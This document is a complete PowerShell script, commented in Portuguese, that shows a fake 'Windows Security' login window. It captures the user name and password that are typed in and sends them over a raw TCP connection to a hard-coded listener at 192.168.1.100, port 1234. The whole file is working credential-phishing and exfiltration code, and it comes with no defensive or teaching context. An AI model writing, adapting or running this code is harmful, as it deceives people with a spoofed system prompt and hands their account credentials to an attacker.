Add-Type -AssemblyName System.Windows.Forms

# Configurações do servidor de escuta
$serverAddress = "192.168.1.100" # endereço IP do host remoto
$serverPort = 1234

# Exibe uma janela de login falsa e captura as credenciais
$loginForm = New-Object System.Windows.Forms.Form 
$loginForm.Text = "Windows Security" 
$loginForm.Size = New-Object System.Drawing.Size(300,200) 
$loginForm.StartPosition = "CenterScreen"

$labelUser = New-Object System.Windows.Forms.Label
$labelUser.Location = New-Object System.Drawing.Point(10,30) 
$labelUser.Size = New-Object System.Drawing.Size(280,20) 
$labelUser.Text = "User name"
$loginForm.Controls.Add($labelUser) 

$textboxUser = New-Object System.Windows.Forms.TextBox
$textboxUser.Location = New-Object System.Drawing.Point(10,50) 
$textboxUser.Size = New-Object System.Drawing.Size(260,20) 
$loginForm.Controls.Add($textboxUser) 

$labelPass = New-Object System.Windows.Forms.Label
$labelPass.Location = New-Object System.Drawing.Point(10,80) 
$labelPass.Size = New-Object System.Drawing.Size(280,20) 
$labelPass.Text = "Password"
$loginForm.Controls.Add($labelPass) 

$textboxPass = New-Object System.Windows.Forms.TextBox
$textboxPass.Location = New-Object System.Drawing.Point(10,100) 
$textboxPass.Size = New-Object System.Drawing.Size(260,20) 
$textboxPass.PasswordChar = '*' 
$loginForm.Controls.Add($textboxPass) 

$buttonOK = New-Object System.Windows.Forms.Button
$buttonOK.Location = New-Object System.Drawing.Point(75,140) 
$buttonOK.Size = New-Object System.Drawing.Size(75,23) 
$buttonOK.Text = "OK"
$buttonOK.DialogResult = [System.Windows.Forms.DialogResult]::OK
$loginForm.AcceptButton = $buttonOK
$loginForm.Controls.Add($buttonOK) 

$buttonCancel = New-Object System.Windows.Forms.Button
$buttonCancel.Location = New-Object System.Drawing.Point(160,140) 
$buttonCancel.Size = New-Object System.Drawing.Size(75,23) 
$buttonCancel.Text = "Cancel"
$buttonCancel.DialogResult = [System.Windows.Forms.DialogResult]::Cancel
$loginForm.CancelButton = $buttonCancel
$loginForm.Controls.Add($buttonCancel) 

$formResult = $loginForm.ShowDialog()

if ($formResult -eq [System.Windows.Forms.DialogResult]::OK) {
    $username = $textboxUser.Text
    $password = $textboxPass.Text

    # Executa o envio das credenciais para o servidor de escuta
    $creds = $username + ":" + $password
    $credsBytes = [System.Text.Encoding]::ASCII.GetBytes($creds)
    $client = New-Object System.Net.Sockets.TcpClient($serverAddress, $serverPort)
    $stream = $client.GetStream()
    $stream.Write($credsBytes, 0, $credsBytes.Length)
    $stream.Close()
    $client.Close()
}
